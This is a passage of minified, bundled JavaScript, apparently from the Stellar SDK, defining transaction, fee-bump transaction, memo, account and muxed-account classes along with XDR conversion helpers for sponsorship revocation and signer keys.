        }, {
            key: "_fromXDRPrice",
            value: function(L) {
                var U = new M.default(L.n());
                return U.div(new M.default(L.d())).toString()
            }
        }, {
            key: "_toXDRPrice",
            value: function(L) {
                var U;
                if (L.n && L.d)
                    U = new F.default.Price(L);
                else {
                    var Z = (0,
                    O.best_r)(L);
                    U = new F.default.Price({
                        n: parseInt(Z[0], 10),
                        d: parseInt(Z[1], 10)
                    })
                }
                if (U.n() < 0 || U.d() < 0)
                    throw new Error("price must be positive");
                return U
            }
        }])
    }();
    function Ae(ce, q) {
        switch (ce.switch().name) {
        case "revokeSponsorshipLedgerEntry":
            {
                var L = ce.ledgerKey();
                switch (L.switch().name) {
                case F.default.LedgerEntryType.account().name:
                    {
                        q.type = "revokeAccountSponsorship",
                        q.account = Be(L.account().accountId());
                        break
                    }
                case F.default.LedgerEntryType.trustline().name:
                    {
                        q.type = "revokeTrustlineSponsorship",
                        q.account = Be(L.trustLine().accountId());
                        var U = L.trustLine().asset();
                        switch (U.switch()) {
                        case F.default.AssetType.assetTypePoolShare():
                            q.asset = Y.LiquidityPoolId.fromOperation(U);
                            break;
                        default:
                            q.asset = x.Asset.fromOperation(U);
                            break
                        }
                        break
                    }
                case F.default.LedgerEntryType.offer().name:
                    {
                        q.type = "revokeOfferSponsorship",
                        q.seller = Be(L.offer().sellerId()),
                        q.offerId = L.offer().offerId().toString();
                        break
                    }
                case F.default.LedgerEntryType.data().name:
                    {
                        q.type = "revokeDataSponsorship",
                        q.account = Be(L.data().accountId()),
                        q.name = L.data().dataName().toString("ascii");
                        break
                    }
                case F.default.LedgerEntryType.claimableBalance().name:
                    {
                        q.type = "revokeClaimableBalanceSponsorship",
                        q.balanceId = L.claimableBalance().balanceId().toXDR("hex");
                        break
                    }
                case F.default.LedgerEntryType.liquidityPool().name:
                    {
                        q.type = "revokeLiquidityPoolSponsorship",
                        q.liquidityPoolId = L.liquidityPool().liquidityPoolId().toString("hex");
                        break
                    }
                default:
                    throw new Error("Unknown ledgerKey: ".concat(ce.switch().name))
                }
                break
            }
        case "revokeSponsorshipSigner":
            {
                q.type = "revokeSignerSponsorship",
                q.account = Be(ce.signer().accountId()),
                q.signer = Ee(ce.signer().signerKey());
                break
            }
        default:
            throw new Error("Unknown revokeSponsorship: ".concat(ce.switch().name))
        }
    }
    function Ee(ce) {
        var q = {};
        switch (ce.switch().name) {
        case F.default.SignerKeyType.signerKeyTypeEd25519().name:
            {
                q.ed25519PublicKey = X.StrKey.encodeEd25519PublicKey(ce.ed25519());
                break
            }
        case F.default.SignerKeyType.signerKeyTypePreAuthTx().name:
            {
                q.preAuthTx = ce.preAuthTx().toString("hex");
                break
            }
        case F.default.SignerKeyType.signerKeyTypeHashX().name:
            {
                q.sha256Hash = ce.hashX().toString("hex");
                break
            }
        default:
            throw new Error("Unknown signerKey: ".concat(ce.switch().name))
        }
        return q
    }
    function Be(ce) {
        return X.StrKey.encodeEd25519PublicKey(ce.ed25519())
    }
    return xe.accountMerge = V.accountMerge,
    xe.allowTrust = V.allowTrust,
    xe.bumpSequence = V.bumpSequence,
    xe.changeTrust = V.changeTrust,
    xe.createAccount = V.createAccount,
    xe.createClaimableBalance = V.createClaimableBalance,
    xe.claimClaimableBalance = V.claimClaimableBalance,
    xe.clawbackClaimableBalance = V.clawbackClaimableBalance,
    xe.createPassiveSellOffer = V.createPassiveSellOffer,
    xe.inflation = V.inflation,
    xe.manageData = V.manageData,
    xe.manageSellOffer = V.manageSellOffer,
    xe.manageBuyOffer = V.manageBuyOffer,
    xe.pathPaymentStrictReceive = V.pathPaymentStrictReceive,
    xe.pathPaymentStrictSend = V.pathPaymentStrictSend,
    xe.payment = V.payment,
    xe.setOptions = V.setOptions,
    xe.beginSponsoringFutureReserves = V.beginSponsoringFutureReserves,
    xe.endSponsoringFutureReserves = V.endSponsoringFutureReserves,
    xe.revokeAccountSponsorship = V.revokeAccountSponsorship,
    xe.revokeTrustlineSponsorship = V.revokeTrustlineSponsorship,
    xe.revokeOfferSponsorship = V.revokeOfferSponsorship,
    xe.revokeDataSponsorship = V.revokeDataSponsorship,
    xe.revokeClaimableBalanceSponsorship = V.revokeClaimableBalanceSponsorship,
    xe.revokeLiquidityPoolSponsorship = V.revokeLiquidityPoolSponsorship,
    xe.revokeSignerSponsorship = V.revokeSignerSponsorship,
    xe.clawback = V.clawback,
    xe.setTrustLineFlags = V.setTrustLineFlags,
    xe.liquidityPoolDeposit = V.liquidityPoolDeposit,
    xe.liquidityPoolWithdraw = V.liquidityPoolWithdraw,
    xe.invokeHostFunction = V.invokeHostFunction,
    xe.extendFootprintTtl = V.extendFootprintTtl,
    xe.restoreFootprint = V.restoreFootprint,
    xe.createStellarAssetContract = V.createStellarAssetContract,
    xe.invokeContractFunction = V.invokeContractFunction,
    xe.createCustomContract = V.createCustomContract,
    xe.uploadContractWasm = V.uploadContractWasm,
    operation
}
var memo = {}, hasRequiredMemo;
function requireMemo() {
    if (hasRequiredMemo)
        return memo;
    hasRequiredMemo = 1,
    Object.defineProperty(memo, "__esModule", {
        value: !0
    }),
    memo.MemoText = memo.MemoReturn = memo.MemoNone = memo.MemoID = memo.MemoHash = memo.Memo = void 0;
    var _ = requireXdr$1()
      , M = O(requireBignumber())
      , j = O(requireXdr());
    function O(ne) {
        return ne && ne.__esModule ? ne : {
            default: ne
        }
    }
    function x(ne) {
        "@babel/helpers - typeof";
        return x = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        x(ne)
    }
    function w(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function b(ne, oe) {
        for (var ue = 0; ue < oe.length; ue++) {
            var fe = oe[ue];
            fe.enumerable = fe.enumerable || !1,
            fe.configurable = !0,
            "value"in fe && (fe.writable = !0),
            Object.defineProperty(ne, Y(fe.key), fe)
        }
    }
    function X(ne, oe, ue) {
        return oe && b(ne.prototype, oe),
        ue && b(ne, ue),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        ne
    }
    function Y(ne) {
        var oe = F(ne, "string");
        return x(oe) == "symbol" ? oe : oe + ""
    }
    function F(ne, oe) {
        if (x(ne) != "object" || !ne)
            return ne;
        var ue = ne[Symbol.toPrimitive];
        if (ue !== void 0) {
            var fe = ue.call(ne, oe);
            if (x(fe) != "object")
                return fe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ne)
    }
    var V = memo.MemoNone = "none"
      , K = memo.MemoID = "id"
      , Q = memo.MemoText = "text"
      , ee = memo.MemoHash = "hash"
      , ae = memo.MemoReturn = "return";
    return memo.Memo = function() {
        function ne(oe) {
            var ue = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
            switch (w(this, ne),
            this._type = oe,
            this._value = ue,
            this._type) {
            case V:
                break;
            case K:
                ne._validateIdValue(ue);
                break;
            case Q:
                ne._validateTextValue(ue);
                break;
            case ee:
            case ae:
                ne._validateHashValue(ue),
                typeof ue == "string" && (this._value = Buffer.from(ue, "hex"));
                break;
            default:
                throw new Error("Invalid memo type")
            }
        }
        return X(ne, [{
            key: "type",
            get: function() {
                return this._type
            },
            set: function(ue) {
                throw new Error("Memo is immutable")
            }
        }, {
            key: "value",
            get: function() {
                switch (this._type) {
                case V:
                    return null;
                case K:
                case Q:
                    return this._value;
                case ee:
                case ae:
                    return Buffer.from(this._value);
                default:
                    throw new Error("Invalid memo type")
                }
            },
            set: function(ue) {
                throw new Error("Memo is immutable")
            }
        }, {
            key: "toXDRObject",
            value: function() {
                switch (this._type) {
                case V:
                    return j.default.Memo.memoNone();
                case K:
                    return j.default.Memo.memoId(_.UnsignedHyper.fromString(this._value));
                case Q:
                    return j.default.Memo.memoText(this._value);
                case ee:
                    return j.default.Memo.memoHash(this._value);
                case ae:
                    return j.default.Memo.memoReturn(this._value);
                default:
                    return null
                }
            }
        }], [{
            key: "_validateIdValue",
            value: function(ue) {
                var fe = new Error("Expects a int64 as a string. Got ".concat(ue));
                if (typeof ue != "string")
                    throw fe;
                var he;
                try {
                    he = new M.default(ue)
                } catch {
                    throw fe
                }
                if (!he.isFinite() || he.isNaN())
                    throw fe
            }
        }, {
            key: "_validateTextValue",
            value: function(ue) {
                if (!j.default.Memo.armTypeForArm("text").isValid(ue))
                    throw new Error("Expects string, array or buffer, max 28 bytes")
            }
        }, {
            key: "_validateHashValue",
            value: function(ue) {
                var fe = new Error("Expects a 32 byte hash value or hex encoded string. Got ".concat(ue));
                if (ue === null || typeof ue > "u")
                    throw fe;
                var he;
                if (typeof ue == "string") {
                    if (!/^[0-9A-Fa-f]{64}$/g.test(ue))
                        throw fe;
                    he = Buffer.from(ue, "hex")
                } else if (Buffer.isBuffer(ue))
                    he = Buffer.from(ue);
                else
                    throw fe;
                if (!he.length || he.length !== 32)
                    throw fe
            }
        }, {
            key: "none",
            value: function() {
                return new ne(V)
            }
        }, {
            key: "text",
            value: function(ue) {
                return new ne(Q,ue)
            }
        }, {
            key: "id",
            value: function(ue) {
                return new ne(K,ue)
            }
        }, {
            key: "hash",
            value: function(ue) {
                return new ne(ee,ue)
            }
        }, {
            key: "return",
            value: function(ue) {
                return new ne(ae,ue)
            }
        }, {
            key: "fromXDRObject",
            value: function(ue) {
                switch (ue.arm()) {
                case "id":
                    return ne.id(ue.value().toString());
                case "text":
                    return ne.text(ue.value());
                case "hash":
                    return ne.hash(ue.value());
                case "retHash":
                    return ne.return(ue.value())
                }
                if (typeof ue.value() > "u")
                    return ne.none();
                throw new Error("Unknown type")
            }
        }])
    }(),
    memo
}
var hasRequiredTransaction;
function requireTransaction() {
    if (hasRequiredTransaction)
        return transaction;
    hasRequiredTransaction = 1;
    function _(ye) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(be) {
            return typeof be
        }
        : function(be) {
            return be && typeof Symbol == "function" && be.constructor === Symbol && be !== Symbol.prototype ? "symbol" : typeof be
        }
        ,
        _(ye)
    }
    Object.defineProperty(transaction, "__esModule", {
        value: !0
    }),
    transaction.Transaction = void 0;
    var M = Y(requireXdr())
      , j = requireHashing()
      , O = requireStrkey()
      , x = requireOperation()
      , w = requireMemo()
      , b = requireTransaction_base()
      , X = requireDecode_encode_muxed_account();
    function Y(ye) {
        return ye && ye.__esModule ? ye : {
            default: ye
        }
    }
    function F(ye, be) {
        if (!(ye instanceof be))
            throw new TypeError("Cannot call a class as a function")
    }
    function V(ye, be) {
        for (var xe = 0; xe < be.length; xe++) {
            var Ae = be[xe];
            Ae.enumerable = Ae.enumerable || !1,
            Ae.configurable = !0,
            "value"in Ae && (Ae.writable = !0),
            Object.defineProperty(ye, Q(Ae.key), Ae)
        }
    }
    function K(ye, be, xe) {
        return be && V(ye.prototype, be),
        Object.defineProperty(ye, "prototype", {
            writable: !1
        }),
        ye
    }
    function Q(ye) {
        var be = ee(ye, "string");
        return _(be) == "symbol" ? be : be + ""
    }
    function ee(ye, be) {
        if (_(ye) != "object" || !ye)
            return ye;
        var xe = ye[Symbol.toPrimitive];
        if (xe !== void 0) {
            var Ae = xe.call(ye, be);
            if (_(Ae) != "object")
                return Ae;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ye)
    }
    function ae(ye, be, xe) {
        return be = fe(be),
        ne(ye, ue() ? Reflect.construct(be, xe || [], fe(ye).constructor) : be.apply(ye, xe))
    }
    function ne(ye, be) {
        if (be && (_(be) == "object" || typeof be == "function"))
            return be;
        if (be !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return oe(ye)
    }
    function oe(ye) {
        if (ye === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return ye
    }
    function ue() {
        try {
            var ye = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (ue = function() {
            return !!ye
        }
        )()
    }
    function fe(ye) {
        return fe = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(be) {
            return be.__proto__ || Object.getPrototypeOf(be)
        }
        ,
        fe(ye)
    }
    function he(ye, be) {
        if (typeof be != "function" && be !== null)
            throw new TypeError("Super expression must either be null or a function");
        ye.prototype = Object.create(be && be.prototype, {
            constructor: {
                value: ye,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(ye, "prototype", {
            writable: !1
        }),
        be && pe(ye, be)
    }
    function pe(ye, be) {
        return pe = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(xe, Ae) {
            return xe.__proto__ = Ae,
            xe
        }
        ,
        pe(ye, be)
    }
    return transaction.Transaction = function(ye) {
        function be(xe, Ae) {
            var Ee;
            if (F(this, be),
            typeof xe == "string") {
                var Be = Buffer.from(xe, "base64");
                xe = M.default.TransactionEnvelope.fromXDR(Be)
            }
            var ce = xe.switch();
            if (!(ce === M.default.EnvelopeType.envelopeTypeTxV0() || ce === M.default.EnvelopeType.envelopeTypeTx()))
                throw new Error("Invalid TransactionEnvelope: expected an envelopeTypeTxV0 or envelopeTypeTx but received an ".concat(ce.name, "."));
            var q = xe.value()
              , L = q.tx()
              , U = L.fee().toString()
              , Z = (q.signatures() || []).slice();
            switch (Ee = ae(this, be, [L, Z, U, Ae]),
            Ee._envelopeType = ce,
            Ee._memo = L.memo(),
            Ee._sequence = L.seqNum().toString(),
            Ee._envelopeType) {
            case M.default.EnvelopeType.envelopeTypeTxV0():
                Ee._source = O.StrKey.encodeEd25519PublicKey(Ee.tx.sourceAccountEd25519());
                break;
            default:
                Ee._source = (0,
                X.encodeMuxedAccountToAddress)(Ee.tx.sourceAccount());
                break
            }
            var te = null
              , se = null;
            switch (Ee._envelopeType) {
            case M.default.EnvelopeType.envelopeTypeTxV0():
                se = L.timeBounds();
                break;
            case M.default.EnvelopeType.envelopeTypeTx():
                switch (L.cond().switch()) {
                case M.default.PreconditionType.precondTime():
                    se = L.cond().timeBounds();
                    break;
                case M.default.PreconditionType.precondV2():
                    te = L.cond().v2(),
                    se = te.timeBounds();
                    break
                }
                break
            }
            if (se && (Ee._timeBounds = {
                minTime: se.minTime().toString(),
                maxTime: se.maxTime().toString()
            }),
            te) {
                var de = te.ledgerBounds();
                de && (Ee._ledgerBounds = {
                    minLedger: de.minLedger(),
                    maxLedger: de.maxLedger()
                });
                var re = te.minSeqNum();
                re && (Ee._minAccountSequence = re.toString()),
                Ee._minAccountSequenceAge = te.minSeqAge(),
                Ee._minAccountSequenceLedgerGap = te.minSeqLedgerGap(),
                Ee._extraSigners = te.extraSigners()
            }
            var $ = L.operations() || [];
            return Ee._operations = $.map(function(ie) {
                return x.Operation.fromXDRObject(ie)
            }),
            Ee
        }
        return he(be, ye),
        K(be, [{
            key: "timeBounds",
            get: function() {
                return this._timeBounds
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "ledgerBounds",
            get: function() {
                return this._ledgerBounds
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "minAccountSequence",
            get: function() {
                return this._minAccountSequence
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "minAccountSequenceAge",
            get: function() {
                return this._minAccountSequenceAge
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "minAccountSequenceLedgerGap",
            get: function() {
                return this._minAccountSequenceLedgerGap
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "extraSigners",
            get: function() {
                return this._extraSigners
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "sequence",
            get: function() {
                return this._sequence
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "source",
            get: function() {
                return this._source
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "operations",
            get: function() {
                return this._operations
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "memo",
            get: function() {
                return w.Memo.fromXDRObject(this._memo)
            },
            set: function(Ae) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "signatureBase",
            value: function() {
                var Ae = this.tx;
                this._envelopeType === M.default.EnvelopeType.envelopeTypeTxV0() && (Ae = M.default.Transaction.fromXDR(Buffer.concat([M.default.PublicKeyType.publicKeyTypeEd25519().toXDR(), Ae.toXDR()])));
                var Ee = new M.default.TransactionSignaturePayloadTaggedTransaction.envelopeTypeTx(Ae)
                  , Be = new M.default.TransactionSignaturePayload({
                    networkId: M.default.Hash.fromXDR((0,
                    j.hash)(this.networkPassphrase)),
                    taggedTransaction: Ee
                });
                return Be.toXDR()
            }
        }, {
            key: "toEnvelope",
            value: function() {
                var Ae = this.tx.toXDR(), Ee = this.signatures.slice(), Be;
                switch (this._envelopeType) {
                case M.default.EnvelopeType.envelopeTypeTxV0():
                    Be = new M.default.TransactionEnvelope.envelopeTypeTxV0(new M.default.TransactionV0Envelope({
                        tx: M.default.TransactionV0.fromXDR(Ae),
                        signatures: Ee
                    }));
                    break;
                case M.default.EnvelopeType.envelopeTypeTx():
                    Be = new M.default.TransactionEnvelope.envelopeTypeTx(new M.default.TransactionV1Envelope({
                        tx: M.default.Transaction.fromXDR(Ae),
                        signatures: Ee
                    }));
                    break;
                default:
                    throw new Error("Invalid TransactionEnvelope: expected an envelopeTypeTxV0 or envelopeTypeTx but received an ".concat(this._envelopeType.name, "."))
                }
                return Be
            }
        }, {
            key: "getClaimableBalanceId",
            value: function(Ae) {
                if (!Number.isInteger(Ae) || Ae < 0 || Ae >= this.operations.length)
                    throw new RangeError("invalid operation index");
                var Ee = this.operations[Ae];
                try {
                    Ee = x.Operation.createClaimableBalance(Ee)
                } catch (U) {
                    throw new TypeError("expected createClaimableBalance, got ".concat(Ee.type, ": ").concat(U))
                }
                var Be = O.StrKey.decodeEd25519PublicKey((0,
                X.extractBaseAddress)(this.source))
                  , ce = M.default.HashIdPreimage.envelopeTypeOpId(new M.default.HashIdPreimageOperationId({
                    sourceAccount: M.default.AccountId.publicKeyTypeEd25519(Be),
                    seqNum: M.default.SequenceNumber.fromString(this.sequence),
                    opNum: Ae
                }))
                  , q = (0,
                j.hash)(ce.toXDR("raw"))
                  , L = M.default.ClaimableBalanceId.claimableBalanceIdTypeV0(q);
                return L.toXDR("hex")
            }
        }])
    }(b.TransactionBase),
    transaction
}
var fee_bump_transaction = {}, hasRequiredFee_bump_transaction;
function requireFee_bump_transaction() {
    if (hasRequiredFee_bump_transaction)
        return fee_bump_transaction;
    hasRequiredFee_bump_transaction = 1;
    function _(he) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(pe) {
            return typeof pe
        }
        : function(pe) {
            return pe && typeof Symbol == "function" && pe.constructor === Symbol && pe !== Symbol.prototype ? "symbol" : typeof pe
        }
        ,
        _(he)
    }
    Object.defineProperty(fee_bump_transaction, "__esModule", {
        value: !0
    }),
    fee_bump_transaction.FeeBumpTransaction = void 0;
    var M = b(requireXdr())
      , j = requireHashing()
      , O = requireTransaction()
      , x = requireTransaction_base()
      , w = requireDecode_encode_muxed_account();
    function b(he) {
        return he && he.__esModule ? he : {
            default: he
        }
    }
    function X(he, pe) {
        if (!(he instanceof pe))
            throw new TypeError("Cannot call a class as a function")
    }
    function Y(he, pe) {
        for (var ye = 0; ye < pe.length; ye++) {
            var be = pe[ye];
            be.enumerable = be.enumerable || !1,
            be.configurable = !0,
            "value"in be && (be.writable = !0),
            Object.defineProperty(he, V(be.key), be)
        }
    }
    function F(he, pe, ye) {
        return pe && Y(he.prototype, pe),
        Object.defineProperty(he, "prototype", {
            writable: !1
        }),
        he
    }
    function V(he) {
        var pe = K(he, "string");
        return _(pe) == "symbol" ? pe : pe + ""
    }
    function K(he, pe) {
        if (_(he) != "object" || !he)
            return he;
        var ye = he[Symbol.toPrimitive];
        if (ye !== void 0) {
            var be = ye.call(he, pe);
            if (_(be) != "object")
                return be;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(he)
    }
    function Q(he, pe, ye) {
        return pe = oe(pe),
        ee(he, ne() ? Reflect.construct(pe, ye || [], oe(he).constructor) : pe.apply(he, ye))
    }
    function ee(he, pe) {
        if (pe && (_(pe) == "object" || typeof pe == "function"))
            return pe;
        if (pe !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return ae(he)
    }
    function ae(he) {
        if (he === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return he
    }
    function ne() {
        try {
            var he = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (ne = function() {
            return !!he
        }
        )()
    }
    function oe(he) {
        return oe = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(pe) {
            return pe.__proto__ || Object.getPrototypeOf(pe)
        }
        ,
        oe(he)
    }
    function ue(he, pe) {
        if (typeof pe != "function" && pe !== null)
            throw new TypeError("Super expression must either be null or a function");
        he.prototype = Object.create(pe && pe.prototype, {
            constructor: {
                value: he,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(he, "prototype", {
            writable: !1
        }),
        pe && fe(he, pe)
    }
    function fe(he, pe) {
        return fe = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(ye, be) {
            return ye.__proto__ = be,
            ye
        }
        ,
        fe(he, pe)
    }
    return fee_bump_transaction.FeeBumpTransaction = function(he) {
        function pe(ye, be) {
            var xe;
            if (X(this, pe),
            typeof ye == "string") {
                var Ae = Buffer.from(ye, "base64");
                ye = M.default.TransactionEnvelope.fromXDR(Ae)
            }
            var Ee = ye.switch();
            if (Ee !== M.default.EnvelopeType.envelopeTypeTxFeeBump())
                throw new Error("Invalid TransactionEnvelope: expected an envelopeTypeTxFeeBump but received an ".concat(Ee.name, "."));
            var Be = ye.value()
              , ce = Be.tx()
              , q = ce.fee().toString()
              , L = (Be.signatures() || []).slice();
            xe = Q(this, pe, [ce, L, q, be]);
            var U = M.default.TransactionEnvelope.envelopeTypeTx(ce.innerTx().v1());
            return xe._feeSource = (0,
            w.encodeMuxedAccountToAddress)(xe.tx.feeSource()),
            xe._innerTransaction = new O.Transaction(U,be),
            xe
        }
        return ue(pe, he),
        F(pe, [{
            key: "innerTransaction",
            get: function() {
                return this._innerTransaction
            }
        }, {
            key: "operations",
            get: function() {
                return this._innerTransaction.operations
            }
        }, {
            key: "feeSource",
            get: function() {
                return this._feeSource
            }
        }, {
            key: "signatureBase",
            value: function() {
                var be = new M.default.TransactionSignaturePayloadTaggedTransaction.envelopeTypeTxFeeBump(this.tx)
                  , xe = new M.default.TransactionSignaturePayload({
                    networkId: M.default.Hash.fromXDR((0,
                    j.hash)(this.networkPassphrase)),
                    taggedTransaction: be
                });
                return xe.toXDR()
            }
        }, {
            key: "toEnvelope",
            value: function() {
                var be = new M.default.FeeBumpTransactionEnvelope({
                    tx: M.default.FeeBumpTransaction.fromXDR(this.tx.toXDR()),
                    signatures: this.signatures.slice()
                });
                return new M.default.TransactionEnvelope.envelopeTypeTxFeeBump(be)
            }
        }])
    }(x.TransactionBase),
    fee_bump_transaction
}
var transaction_builder = {}, account = {}, hasRequiredAccount;
function requireAccount() {
    if (hasRequiredAccount)
        return account;
    hasRequiredAccount = 1,
    Object.defineProperty(account, "__esModule", {
        value: !0
    }),
    account.Account = void 0;
    var _ = j(requireBignumber())
      , M = requireStrkey();
    function j(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function O(F) {
        "@babel/helpers - typeof";
        return O = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(V) {
            return typeof V
        }
        : function(V) {
            return V && typeof Symbol == "function" && V.constructor === Symbol && V !== Symbol.prototype ? "symbol" : typeof V
        }
        ,
        O(F)
    }
    function x(F, V) {
        if (!(F instanceof V))
            throw new TypeError("Cannot call a class as a function")
    }
    function w(F, V) {
        for (var K = 0; K < V.length; K++) {
            var Q = V[K];
            Q.enumerable = Q.enumerable || !1,
            Q.configurable = !0,
            "value"in Q && (Q.writable = !0),
            Object.defineProperty(F, X(Q.key), Q)
        }
    }
    function b(F, V, K) {
        return V && w(F.prototype, V),
        Object.defineProperty(F, "prototype", {
            writable: !1
        }),
        F
    }
    function X(F) {
        var V = Y(F, "string");
        return O(V) == "symbol" ? V : V + ""
    }
    function Y(F, V) {
        if (O(F) != "object" || !F)
            return F;
        var K = F[Symbol.toPrimitive];
        if (K !== void 0) {
            var Q = K.call(F, V);
            if (O(Q) != "object")
                return Q;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(F)
    }
    return account.Account = function() {
        function F(V, K) {
            if (x(this, F),
            M.StrKey.isValidMed25519PublicKey(V))
                throw new Error("accountId is an M-address; use MuxedAccount instead");
            if (!M.StrKey.isValidEd25519PublicKey(V))
                throw new Error("accountId is invalid");
            if (typeof K != "string")
                throw new Error("sequence must be of type string");
            this._accountId = V,
            this.sequence = new _.default(K)
        }
        return b(F, [{
            key: "accountId",
            value: function() {
                return this._accountId
            }
        }, {
            key: "sequenceNumber",
            value: function() {
                return this.sequence.toString()
            }
        }, {
            key: "incrementSequenceNumber",
            value: function() {
                this.sequence = this.sequence.plus(1)
            }
        }])
    }(),
    account
}
var muxed_account = {}, hasRequiredMuxed_account;
function requireMuxed_account() {
    if (hasRequiredMuxed_account)
        return muxed_account;
    hasRequiredMuxed_account = 1,
    Object.defineProperty(muxed_account, "__esModule", {
        value: !0
    }),
    muxed_account.MuxedAccount = void 0;
    var _ = x(requireXdr())
      , M = requireAccount()
      , j = requireStrkey()
      , O = requireDecode_encode_muxed_account();
    function x(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function w(K) {
        "@babel/helpers - typeof";
        return w = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(Q) {
            return typeof Q
        }
        : function(Q) {
            return Q && typeof Symbol == "function" && Q.constructor === Symbol && Q !== Symbol.prototype ? "symbol" : typeof Q
        }
        ,
        w(K)
    }
    function b(K, Q) {
        if (!(K instanceof Q))
            throw new TypeError("Cannot call a class as a function")
    }
    function X(K, Q) {
        for (var ee = 0; ee < Q.length; ee++) {
            var ae = Q[ee];
            ae.enumerable = ae.enumerable || !1,
            ae.configurable = !0,
            "value"in ae && (ae.writable = !0),
            Object.defineProperty(K, F(ae.key), ae)
        }
    }
    function Y(K, Q, ee) {
        return Q && X(K.prototype, Q),
        ee && X(K, ee),
        Object.defineProperty(K, "prototype", {
            writable: !1
        }),
        K
    }
    function F(K) {
        var Q = V(K, "string");
        return w(Q) == "symbol" ? Q : Q + ""
    }
    function V(K, Q) {
        if (w(K) != "object" || !K)
            return K;
        var ee = K[Symbol.toPrimitive];
        if (ee !== void 0) {
            var ae = ee.call(K, Q);
            if (w(ae) != "object")
                return ae;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(K)
    }
    return muxed_account.MuxedAccount = function() {
        function K(Q, ee) {
            b(this, K);
            var ae = Q.accountId();
            if (!j.StrKey.isValidEd25519PublicKey(ae))
                throw new Error("accountId is invalid");
            this.account = Q,
            this._muxedXdr = (0,
            O.encodeMuxedAccount)(ae, ee),
            this._mAddress = (0,
            O.encodeMuxedAccountToAddress)(this._muxedXdr),
            this._id = ee
        }
        return Y(K, [{
            key: "baseAccount",
            value: function() {
                return this.account
            }
        }, {
            key: "accountId",
            value: function() {
                return this._mAddress
            }
        }, {
            key: "id",
            value: function() {
                return this._id
            }
        }, {
            key: "setId",
            value: function(ee) {
                if (typeof ee != "string")
                    throw new Error("id should be a string representing a number (uint64)");
                return this._muxedXdr.med25519().id(_.default.Uint64.fromString(ee)),
                this._mAddress = (0,
                O.encodeMuxedAccountToAddress)(this._muxedXdr),
                this._id = ee,
                this
            }
        }, {
            key: "sequenceNumber",
            value: function() {
                return this.account.sequenceNumber()
            }
        }, {
            key: "incrementSequenceNumber",
            value: function() {
                return this.account.incrementSequenceNumber()
            }
        }, {
            key: "toXDRObject",
            value: function() {
                return this._muxedXdr
            }
        }, {
            key: "equals",
            value: function(ee) {
                return this.accountId() === ee.accountId()
            }
        }], [{
            key: "fromAddress",
            value: function(ee, ae) {
                var ne = (0,
                O.decodeAddressToMuxedAccount)(ee)
                  , oe = (0,
                O.extractBaseAddress)(ee)
                  , ue = ne.med25519().id().toString();
                return new K(new M.Account(oe,ae),ue)
            }
        }])
    }(),
    muxed_account
}
var sorobandata_builder = {}, hasRequiredSorobandata_builder;
function requireSorobandata_builder() {
    if (hasRequiredSorobandata_builder)
        return sorobandata_builder;
    hasRequiredSorobandata_builder = 1,
    Object.defineProperty(sorobandata_builder, "__esModule", {
        value: !0
    }),
    sorobandata_builder.SorobanDataBuilder = void 0;
    var _ = M(requireXdr());
    function M(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function j(F) {
        "@babel/helpers - typeof";
        return j = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(V) {
            return typeof V
        }
        : function(V) {
            return V && typeof Symbol == "function" && V.constructor === Symbol && V !== Symbol.prototype ? "symbol" : typeof V
        }
        ,
        j(F)
    }
    function O(F, V) {
        if (!(F instanceof V))
            throw new TypeError("Cannot call a class as a function")
    }
    function x(F, V) {
        for (var K = 0; K < V.length; K++) {
            var Q = V[K];
            Q.enumerable = Q.enumerable || !1,
            Q.configurable = !0,
            "value"in Q && (Q.writable = !0),
            Object.defineProperty(F, X(Q.key), Q)
        }
    }
    function w(F, V, K) {
        return V && x(F.prototype, V),
        K && x(F, K),
        Object.defineProperty(F, "prototype", {
            writable: !1
        }),
        F
    }
    function b(F, V, K) {
